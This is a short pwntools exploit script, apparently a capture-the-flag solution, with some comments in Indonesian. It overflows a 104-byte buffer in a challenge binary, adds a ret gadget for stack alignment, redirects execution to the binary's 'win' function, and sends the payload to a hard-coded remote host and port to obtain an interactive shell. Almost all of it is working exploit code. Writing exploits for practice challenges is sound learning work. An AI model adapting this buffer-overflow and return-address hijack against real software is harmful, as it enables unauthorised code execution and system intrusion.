#!/usr/bin/env python3
#!/usr/bin/env python3
from pwn import *

# Set target binary
exe = './chall'
elf = context.binary = ELF(exe)

# Remote server details
host = '13.250.8.136'
port = 11101

# Connect to the remote server
p = remote(host, port)

# Offset 104 bytes fix
offset = 104

# Cari instruksi 'ret' secara otomatis buat alignment
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found RET gadget at: {hex(ret_gadget)}")

# Build the payload
payload = b'A' * offset
payload += p64(ret_gadget)    # Fix stack alignment (MOVAPS issue)
payload += p64(elf.sym['win']) # Loncat ke target

# Send the payload
p.recvuntil(b'Input text : ')
log.info("Sending payload to overwrite RIP...")
p.sendline(payload)

# Get that shell bro!
p.interactive()
